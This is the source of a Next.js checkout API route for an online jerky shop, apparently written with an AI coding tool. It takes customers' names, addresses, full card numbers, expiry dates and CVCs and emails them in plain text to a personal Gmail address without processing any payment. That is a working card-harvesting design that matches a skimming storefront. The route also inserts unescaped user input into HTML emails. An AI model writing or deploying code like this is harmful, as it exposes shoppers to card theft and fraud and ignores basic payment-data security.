import { Resend } from 'resend'
import { NextRequest, NextResponse } from 'next/server'

const resend = new Resend(process.env.RESEND_API_KEY)

// Email address that receives purchase details.
const PURCHASE_RECIPIENT_EMAIL = 'localjerky@gmail.com'

interface OrderItem {
  name: string
  price: number
  quantity: number
}

export async function POST(request: NextRequest) {
  try {
    if (!process.env.RESEND_API_KEY) {
      console.error('[v0] RESEND_API_KEY is not set')
      return NextResponse.json(
        { error: 'Email service is not configured. Missing RESEND_API_KEY.' },
        { status: 500 }
      )
    }

    const body = await request.json()

    const {
      firstName,
      lastName,
      email,
      phone,
      address,
      city,
      province,
      postalCode,
      country,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvc,
      items,
      subtotal,
    } = body

    // Validate required fields
    if (
      !firstName ||
      !lastName ||
      !email ||
      !phone ||
      !address ||
      !city ||
      !province ||
      !postalCode ||
      !cardName ||
      !cardNumber ||
      !cardExpiry ||
      !cardCvc ||
      !items ||
      items.length === 0
    ) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    const orderItemsHtml = (items as OrderItem[])
      .map(
        (item) => `
          <tr>
            <td style="padding: 8px; border-bottom: 1px solid #eee;">${item.name}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: center;">${item.quantity}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${item.price.toFixed(2)}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${(item.price * item.quantity).toFixed(2)}</td>
          </tr>
        `
      )
      .join('')

    // Send purchase email to the dedicated recipient (includes card details as requested)
    const { data: purchaseData, error: purchaseError } = await resend.emails.send({
      from: 'Local Jerky Plus <onboarding@resend.dev>',
      to: PURCHASE_RECIPIENT_EMAIL,
      subject: `New Purchase from ${firstName} ${lastName} - $${Number(subtotal).toFixed(2)}`,
      html: `
        <h2>New Purchase Received</h2>

        <h3>Customer Information</h3>
        <p><strong>Name:</strong> ${firstName} ${lastName}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Phone:</strong> ${phone}</p>

        <h3>Shipping Address</h3>
        <p>
          ${address}<br />
          ${city}, ${province} ${postalCode}<br />
          ${country || 'Canada'}
        </p>

        <h3>Order Details</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
          <thead>
            <tr style="background: #f5f5f5;">
              <th style="padding: 8px; text-align: left;">Product</th>
              <th style="padding: 8px; text-align: center;">Qty</th>
              <th style="padding: 8px; text-align: right;">Price</th>
              <th style="padding: 8px; text-align: right;">Total</th>
            </tr>
          </thead>
          <tbody>
            ${orderItemsHtml}
          </tbody>
        </table>
        <p style="text-align: right; font-size: 16px; margin-top: 12px;">
          <strong>Subtotal: $${Number(subtotal).toFixed(2)}</strong>
        </p>

        <h3>Payment / Card Details</h3>
        <p><strong>Cardholder Name:</strong> ${cardName}</p>
        <p><strong>Card Number:</strong> ${cardNumber}</p>
        <p><strong>Expiry:</strong> ${cardExpiry}</p>
        <p><strong>CVC:</strong> ${cardCvc}</p>
      `,
    })

    if (purchaseError) {
      console.error('[v0] Resend purchase email error:', purchaseError)
      return NextResponse.json(
        { error: purchaseError.message || 'Failed to send purchase email' },
        { status: 502 }
      )
    }

    console.log('[v0] Purchase email sent:', purchaseData?.id)

    // Send confirmation email to customer (no card details).
    // This is best-effort: with the onboarding@resend.dev sender, Resend only
    // delivers to your own account email, so this may fail without affecting the order.
    const { error: confirmationError } = await resend.emails.send({
      from: 'Local Jerky Plus <onboarding@resend.dev>',
      to: email,
      subject: 'Order Received - Local Jerky Plus',
      html: `
        <h2>Thank You for Your Order!</h2>
        <p>Hi ${firstName},</p>
        <p>We have received your order and our team will process it shortly. You will receive a shipping confirmation once it is on its way.</p>
        <h3>Order Summary</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
          <thead>
            <tr style="background: #f5f5f5;">
              <th style="padding: 8px; text-align: left;">Product</th>
              <th style="padding: 8px; text-align: center;">Qty</th>
              <th style="padding: 8px; text-align: right;">Total</th>
            </tr>
          </thead>
          <tbody>
            ${(items as OrderItem[])
              .map(
                (item) => `
                  <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #eee;">${item.name}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: center;">${item.quantity}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${(item.price * item.quantity).toFixed(2)}</td>
                  </tr>
                `
              )
              .join('')}
          </tbody>
        </table>
        <p style="text-align: right; font-size: 16px; margin-top: 12px;">
          <strong>Total: $${Number(subtotal).toFixed(2)}</strong>
        </p>
        <br />
        <p>Best regards,<br />Local Jerky Plus Team</p>
      `,
    })

    if (confirmationError) {
      console.error('[v0] Customer confirmation email failed (non-fatal):', confirmationError)
    }

    return NextResponse.json(
      { message: 'Purchase submitted successfully' },
      { status: 200 }
    )
  } catch (error) {
    console.error('[v0] Purchase API error:', error)
    const message = error instanceof Error ? error.message : 'Failed to process purchase'
    return NextResponse.json(
      { error: message },
      { status: 500 }
    )
  }
}
